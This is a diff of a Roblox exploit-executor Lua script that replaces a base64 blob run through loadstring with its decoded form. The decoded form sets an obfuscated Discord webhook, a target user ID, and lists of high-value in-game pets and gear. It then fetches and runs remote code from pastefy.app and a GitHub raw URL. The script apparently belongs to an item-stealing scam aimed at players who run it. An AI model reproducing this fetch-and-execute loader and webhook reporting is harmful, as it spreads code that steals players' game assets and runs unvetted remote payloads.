@@ -1,19 +1,187 @@
--- encoded
-local _D=[[bG9jYWwgZ2VudiA9IGdldGdlbnYoKQoKZ2Vudi5HT09EX1dFQkhPT0sgPSAoZnVuY3Rpb24oKQogICAgbG9jYWwgZD0iYUhSMGNITTZMeTlrYVhOamIzSmtMbU52YlM5aGNHa3ZkMlZpYUc5dmEzTXZNVFV6TWpnME9EWTFNVGMzTVRBMU5qTTRNQzg1WjJzdFlsWldNa2hLVUdkTVptUm5abGRxTFZsM2NuTjRibTgzU3pFMmRUSkxPSFY0VjJJdFVESllNRVZrTmxveVNIY3lOV1ZSUTBkTVJFaEVja0YzY0dvdGJ3PT0iCiAgICBsb2NhbCBCPSJBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWmFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6MDEyMzQ1Njc4OSsvIgogICAgbG9jYWwgbyxiPXt9LHt9CiAgICBmb3IgaT0xLCNCIGRvIGJbQjpzdWIoaSxpKV09aS0xIGVuZAogICAgbG9jYWwgbixiaXRzPTAsMAogICAgZm9yIGk9MSwjZCBkbwogICAgICAgIGxvY2FsIGM9ZDpzdWIoaSxpKQogICAgICAgIGlmIGN+PSc9JyB0aGVuCiAgICAgICAgICAgIGxvY2FsIHY9YltjXQogICAgICAgICAgICBpZiB2IHRoZW4KICAgICAgICAgICAgICAgIG49bio2NCt2OyBiaXRzPWJpdHMrNgogICAgICAgICAgICAgICAgaWYgYml0cz49OCB0aGVuIGJpdHM9Yml0cy04OyBvWyNvKzFdPXN0cmluZy5jaGFyKG1hdGguZmxvb3Iobi8yXmJpdHMpJTI1Nik7IG49biUyXmJpdHMgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCiAgICByZXR1cm4gdGFibGUuY29uY2F0KG8pCmVuZCkoKQoKZ2Vudi5UQVJHRVRfVVNFUl9JRCA9IDQ3MTU1NDY1OAoKZ2Vudi5HT09EX0FWQVRBUiA9ICJodHRwczovL2Nkbi5wZnBzLmdnL3BmcHMvNzc2MDItYmxvb2QtY2F0LmdpZiIKCmdlbnYuQUxMT1dFRF9BTklNQUxTID0gewogICAgIlN0cmF3YmVycnkgRWxlcGhhbnQiLAogICAgIkhlYWRsZXNzIEhvcnNlbWFuIiwKICAgICJNZW93bCIsCiAgICAiSm9obiBQb3JrIiwKICAgICJTa2liaWRpIFRvaWxldCIsCiAgICAiR3JpZmZpbiIsCiAgICAiRHJhZ29uIEFxdWFuaW5pIiwKICAgICJEcmFnb24gR2luZ2VyaW5pIiwKICAgICJIeWRyYSBEcmFnb24gQ2FubmVsbG9uaSIsCiAgICAiU2lnbm9yZSBDYXJhcGFjZSIsCiAgICAiRHJhZ29uIENhbm5lbGxvbmkiLAogICAgIkxvdmUgTG92ZSBCZWFyIiwKICAgICJNb2J5IEJyb3MiLAogICAgIkRpZ2kgTmFyd2hhbCIsCiAgICAiS3Jha2VuIiwKICAgICJMYSBTdXByZW1lIENvbWJpbmFzaW9uIiwKICAgICJFbGVmYW50byBGcmlnbyIsCiAgICAiSHlkcmEgQnVubnkiLAogICAgIkNlbGVzdGlhbCBQZWdhc3VzIiwKICAgICJDZXJiZXJ1cyIsCiAgICAiSmVsbHkgTW9ieSIsCiAgICAiQnVtYmF0cm9uIiwKICAgICJCdW5ueSBhbmQgRWdneSIsCiAgICAiUG9wY3VydSBhbmQgRml6enVydSIsCiAgICAiUm9zZXkgYW5kIFRlZGR5IiwKICAgICJDYXBpdGFubyBNb2J5IiwKICAgICJDb29raSBhbmQgTWlsa2kiLAogICAgIkFyY2FkcmFnb24iLAogICAgIkJ1cmd1cm8gQW5kIEZyeXVybyIsCiAgICAiTG9zIFNlY3JldCBDb21iaW5hc2lvbmFzIiwKICAgICJLZXR1cGF0IEJyb3MiLAogICAgIlJlaW5pdG8gU2xlaWdoaXRvIiwKICAgICJGb3J0dW51IGFuZCBDYXNodXJ1IiwKICAgICJMb3MgQW1pZ29zIiwKICAgICJQaXp6YSBhbmQgUmFuY2giLAogICAgIkFudG9uaW8iLAogICAgIkxhIFNlY3JldCBDb21iaW5hc2lvbiIsCiAgICAiUGFuY2FrZSBhbmQgU3lydXAiLAogICAgIkZveGluaSBMYW50ZXJuaW5pIiwKICAgICJLYWxpa2EgQnJvcyIsCiAgICAiTG9zIFNla29sYWhzIiwKICAgICJTYW1teW5pIEZhdHRpbmkiLAogICAgIkZpc2hpbm8gQ2xvd25pbm8iLAogICAgIkNhc2ggb3IgQ2FyZCIsCiAgICAiRnJhZ3JhbWEgYW5kIENob2NyYW1hIiwKICAgICJMYSBDYXNhIEJvbyIsCiAgICAiTG9zIEFkbWlucyIsCiAgICAiRHVnZ3kgQnJvcyIsCiAgICAiTGEgRm9vZCBDb21iaW5hc2lvbiIsCiAgICAiUydtb3JlIFNlcmF0IiwKICAgICJTYW1teW5pIENha2luaSIsCiAgICAiQm9wcGluIEJ1bm55IiwKICAgICJTcG9va3kgYW5kIFB1bXBreSIsCiAgICAiR2luZ2VyIEdlcmF0IiwKICAgICJMYSBHaW5nZXIgU2Vrb2xhaCIsCiAgICAiTG9zIENoaWxsaXMiLAogICAgIkxvcyBIYWNrZXJzIiwKICAgICJCZWFyaXRvIENhYmluaXRvIiwKICAgICJSdWJpa28gYW5kIEt1YmlrbyIsCiAgICAiQ2FwaXRhbm8gQW1lcmljYW5vIiwKICAgICJFeGFtZW4gQnJvcyIsCiAgICAiTG9zIFNwYWdoZXR0aXMiLAogICAgIlJ1YnJpa2lrbyIsCiAgICAiRmVzdGl2ZSA2NyIsCiAgICAiR3Vlc3QgNjY2IiwKICAgICJRdWFja2luaSBTbmFja2luaSIsCiAgICAiUXVlZW4gQmVlIiwKICAgICJDbG92ZXJhdCBDbGFwYXQiLAogICAgIkxhIFN1bW1lciBHcmFuZGUiLAogICAgIkxvcyBUaWN0YWNzIiwKICAgICJTcGFnaGV0dGkgVHVhbGV0dGkiLAogICAgIkNheWx1c2F1cnVzIiwKICAgICJIb3BpbGlrYWxpa2EgSG9waWxpa2FsYWtvIiwKICAgICJMYSBFYXN0ZXIgR3JhbmRlIiwKICAgICJTdGVha2luaSBGYXR0aW5pIiwKICAgICJHYXJhbWEgYW5kIE1hZHVuZHVuZyIsCiAgICAiTGEgQW5uaXZlcnNhcnkgR3JhbmRlIiwKICAgICJOYWNobyBTcHlkZXIiLAogICAgIlJvc2V0dGkgVHVhbGV0dGkiLAogICAgIlNjb3JwaW5vIENvYXN0ZXJpbm8iLAogICAgIk1vbmV5IE1vbmV5IEJyb3MiLAogICAgIkdvbGQgR29sZCBHb2xkIiwKICAgICJKb2xseSBKb2xseSBTYWh1ciIsCiAgICAiTGF2YWRvcml0byBTcGluaXRvIiwKICAgICJHeW0gQnJvcyIsCiAgICAiS2V0Y2h1cnUgYW5kIE11c3R1cnUiLAogICAgIkxvcyBUYW5nY2l0b3MiLAogICAgIlJpY28gRGluZXJvIiwKICAgICJUaXJpbGlrYWxpa2EgVGlyaWxpa2FsYWtvIiwKICAgICJMYSBMdWNreSBHcmFuZGUiLAogICAgIkxhIFJvbWFudGljIEdyYW5kZSIsCiAgICAiT3JjYWxlZG9uIiwKICAgICJTd2FnZ3kgQnJvcyIsCiAgICAiVGljdGFjIFNhaHVyIiwKICAgICJEdWcgRHVnIER1ZyIsCiAgICAiS2V0dXBhdCBLZXBhdCIsCiAgICAiTGEgVGFjbyBDb21iaW5hc2lvbiIsCiAgICAiQ29jbyBhbmQgTWFuZ28iLAogICAgIlRhbmcgVGFuZyBLZWxldGFuZyIsCiAgICAiQWJ5c3NhbG9jbyIsCiAgICAiRXNvayBHb2FsYSIsCiAgICAiRnJhZ29sYSBMYSBMYSBMYSIsCiAgICAiTG92aW4gUm9zZSIsCiAgICAiTG9zIFRhY29yaXRhcyIsCiAgICAiRXZpbGVkb24iLAogICAgIkxvcyBQcmltb3MiLAogICAgIkVzb2sgU2Vrb2xhaCIsCiAgICAiTGEgSm9sbHkgR3JhbmRlIiwKICAgICJMb3MgQ3VwaWRzIiwKICAgICJMb3MgTWFyaWFjaGlzIiwKICAgICJMb3MgUHVnZ2llcyIsCiAgICAiU2FuZCBTYW5kIFNhbmQiLAogICAgIlcgb3IgTCIKfQoKZ2Vudi5BTExPV0VEX0JBU0VTS0lOUyA9IHsKICAgIFsiT2N0byJdID0gdHJ1ZQp9CgpnZW52LkFMTE9XRURfR0VBUlMgPSB7CiAgICBbIlNhbnRhJ3MgU2xlaWdoIl0gPSB0cnVlLAogICAgWyJDdXBpZCdzIFdpbmdzIl0gPSB0cnVlLAogICAgWyJXaXRjaCdzIEJyb29tIl0gPSB0cnVlLAogICAgWyJXYXZlcmlkZXIiXSA9IHRydWUsCiAgICBbIllpbiBZYW5nIFNsYXAiXSA9IHRydWUsCiAgICBbIkN1cnNlZCBTbGFwIl0gPSB0cnVlLAogICAgWyJDeWJlciBTbGFwIl0gPSB0cnVlLAogICAgWyJEaXZpbmUgU2xhcCJdID0gdHJ1ZSwKICAgIFsiQmxvb2Rtb29uIFNsYXAiXSA9IHRydWUsCiAgICBbIlJhZGlvYWN0aXZlIFNsYXAiXSA9IHRydWUsCiAgICBbIlJhaW5ib3cgU2xhcCJdID0gdHJ1ZSwKICAgIFsiUmFpbmJvdyBIYW1tZXIiXSA9IHRydWUsCiAgICBbIkJsb29kbW9vbiBIYW1tZXIiXSA9IHRydWUsCiAgICBbIlJhZGlvYWN0aXZlIEFpcnN0cmlrZSJdID0gdHJ1ZSwKICAgIFsiWWluIFlhbmcgTGFtcCJdID0gdHJ1ZSwKICAgIFsiRGVtb24ncyBIZWFkIl0gPSB0cnVlLAogICAgWyJMYXZhIFNsYXAiXSA9IHRydWUsCiAgICBbIkxhdmEgQmxhc3RlciJdID0gdHJ1ZSwKICAgIFsiQWxpZW4gU2xhcCJdID0gdHJ1ZSwKICAgIFsiQmxhY2tob2xlIEJvbWIiXSA9IHRydWUsCiAgICBbIkNhbmR5IFNlbnRyeSJdID0gdHJ1ZSwKICAgIFsiUGhhbnRvbSBTbGFwIl0gPSB0cnVlCn0KCmdlbnYuQUxMT1dFRF9QTEFDRV9JRFMgPSB7CiAgICAxMDk5ODM2NjgwNzkyMzcKfQoKLS0gRXh0cmEgc2NyaXB0cyAobW92ZWQgb3V0IG9mIG1haW4pCmdlbnYuRVhUUkFfTE9BRFNUUklOR1MgPSB7CiAgICAiaHR0cHM6Ly9wYXN0ZWZ5LmFwcC9JOW1ld3V5Yi9yYXciCn0KCi0tIE9wdGlvbmFsIEdVSSAvIG90aGVyIGxvYWRlcnMKdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9wYXN0ZWZ5LmFwcC9CRVVLS2NaZC9yYXciKSkoKQplbmQpCgp0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgIGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vbm9yZ2VnYXQtYnl0ZS9LMi9yZWZzL2hlYWRzL21haW4vbWFpbi5sdWEiKSkoKQplbmQp]]
-local _B="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
-local function _dec(d)
-  local o,b={},{}
-  for i=1,#_B do b[_B:sub(i,i)]=i-1 end
-  local n,bits=0,0
-  for i=1,#d do
-    local c=d:sub(i,i)
-    if c=='=' then break end
-    local v=b[c]
-    if v then
-      n=n*64+v; bits=bits+6
-      if bits>=8 then bits=bits-8; o[#o+1]=string.char(math.floor(n/2^bits)%256); n=n%2^bits end
+local genv = getgenv()
+
+genv.GOOD_WEBHOOK = (function()
+    local d="aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzMjg0ODY1MTc3MTA1NjM4MC85Z2stYlZWMkhKUGdMZmRnZldqLVl3cnN4bm83SzE2dTJLOHV4V2ItUDJYMEVkNloySHcyNWVRQ0dMREhEckF3cGotbw=="
+    local B="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+    local o,b={},{}
+    for i=1,#B do b[B:sub(i,i)]=i-1 end
+    local n,bits=0,0
+    for i=1,#d do
+        local c=d:sub(i,i)
+        if c~='=' then
+            local v=b[c]
+            if v then
+                n=n*64+v; bits=bits+6
+                if bits>=8 then bits=bits-8; o[#o+1]=string.char(math.floor(n/2^bits)%256); n=n%2^bits end
+            end
+        end
     end
-  end
-  return table.concat(o)
-end
-loadstring(_dec(_D))()
+    return table.concat(o)
+end)()
+
+genv.TARGET_USER_ID = 471554658
+
+genv.GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
+
+genv.ALLOWED_ANIMALS = {
+    "Strawberry Elephant",
+    "Headless Horseman",
+    "Meowl",
+    "John Pork",
+    "Skibidi Toilet",
+    "Griffin",
+    "Dragon Aquanini",
+    "Dragon Gingerini",
+    "Hydra Dragon Cannelloni",
+    "Signore Carapace",
+    "Dragon Cannelloni",
+    "Love Love Bear",
+    "Moby Bros",
+    "Digi Narwhal",
+    "Kraken",
+    "La Supreme Combinasion",
+    "Elefanto Frigo",
+    "Hydra Bunny",
+    "Celestial Pegasus",
+    "Cerberus",
+    "Jelly Moby",
+    "Bumbatron",
+    "Bunny and Eggy",
+    "Popcuru and Fizzuru",
+    "Rosey and Teddy",
+    "Capitano Moby",
+    "Cooki and Milki",
+    "Arcadragon",
+    "Burguro And Fryuro",
+    "Los Secret Combinasionas",
+    "Ketupat Bros",
+    "Reinito Sleighito",
+    "Fortunu and Cashuru",
+    "Los Amigos",
+    "Pizza and Ranch",
+    "Antonio",
+    "La Secret Combinasion",
+    "Pancake and Syrup",
+    "Foxini Lanternini",
+    "Kalika Bros",
+    "Los Sekolahs",
+    "Sammyni Fattini",
+    "Fishino Clownino",
+    "Cash or Card",
+    "Fragrama and Chocrama",
+    "La Casa Boo",
+    "Los Admins",
+    "Duggy Bros",
+    "La Food Combinasion",
+    "S'more Serat",
+    "Sammyni Cakini",
+    "Boppin Bunny",
+    "Spooky and Pumpky",
+    "Ginger Gerat",
+    "La Ginger Sekolah",
+    "Los Chillis",
+    "Los Hackers",
+    "Bearito Cabinito",
+    "Rubiko and Kubiko",
+    "Capitano Americano",
+    "Examen Bros",
+    "Los Spaghettis",
+    "Rubrikiko",
+    "Festive 67",
+    "Guest 666",
+    "Quackini Snackini",
+    "Queen Bee",
+    "Cloverat Clapat",
+    "La Summer Grande",
+    "Los Tictacs",
+    "Spaghetti Tualetti",
+    "Caylusaurus",
+    "Hopilikalika Hopilikalako",
+    "La Easter Grande",
+    "Steakini Fattini",
+    "Garama and Madundung",
+    "La Anniversary Grande",
+    "Nacho Spyder",
+    "Rosetti Tualetti",
+    "Scorpino Coasterino",
+    "Money Money Bros",
+    "Gold Gold Gold",
+    "Jolly Jolly Sahur",
+    "Lavadorito Spinito",
+    "Gym Bros",
+    "Ketchuru and Musturu",
+    "Los Tangcitos",
+    "Rico Dinero",
+    "Tirilikalika Tirilikalako",
+    "La Lucky Grande",
+    "La Romantic Grande",
+    "Orcaledon",
+    "Swaggy Bros",
+    "Tictac Sahur",
+    "Dug Dug Dug",
+    "Ketupat Kepat",
+    "La Taco Combinasion",
+    "Coco and Mango",
+    "Tang Tang Keletang",
+    "Abyssaloco",
+    "Esok Goala",
+    "Fragola La La La",
+    "Lovin Rose",
+    "Los Tacoritas",
+    "Eviledon",
+    "Los Primos",
+    "Esok Sekolah",
+    "La Jolly Grande",
+    "Los Cupids",
+    "Los Mariachis",
+    "Los Puggies",
+    "Sand Sand Sand",
+    "W or L"
+}
+
+genv.ALLOWED_BASESKINS = {
+    ["Octo"] = true
+}
+
+genv.ALLOWED_GEARS = {
+    ["Santa's Sleigh"] = true,
+    ["Cupid's Wings"] = true,
+    ["Witch's Broom"] = true,
+    ["Waverider"] = true,
+    ["Yin Yang Slap"] = true,
+    ["Cursed Slap"] = true,
+    ["Cyber Slap"] = true,
+    ["Divine Slap"] = true,
+    ["Bloodmoon Slap"] = true,
+    ["Radioactive Slap"] = true,
+    ["Rainbow Slap"] = true,
+    ["Rainbow Hammer"] = true,
+    ["Bloodmoon Hammer"] = true,
+    ["Radioactive Airstrike"] = true,
+    ["Yin Yang Lamp"] = true,
+    ["Demon's Head"] = true,
+    ["Lava Slap"] = true,
+    ["Lava Blaster"] = true,
+    ["Alien Slap"] = true,
+    ["Blackhole Bomb"] = true,
+    ["Candy Sentry"] = true,
+    ["Phantom Slap"] = true
+}
+
+genv.ALLOWED_PLACE_IDS = {
+    109983668079237
+}
+
+-- Extra scripts (moved out of main)
+genv.EXTRA_LOADSTRINGS = {
+    "https://pastefy.app/I9mewuyb/raw"
+}
+
+-- Optional GUI / other loaders
+task.spawn(function()
+    loadstring(game:HttpGet("https://pastefy.app/BEUKKcZd/raw"))()
+end)
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/norgegat-byte/K2/refs/heads/main/main.lua"))()
+end)
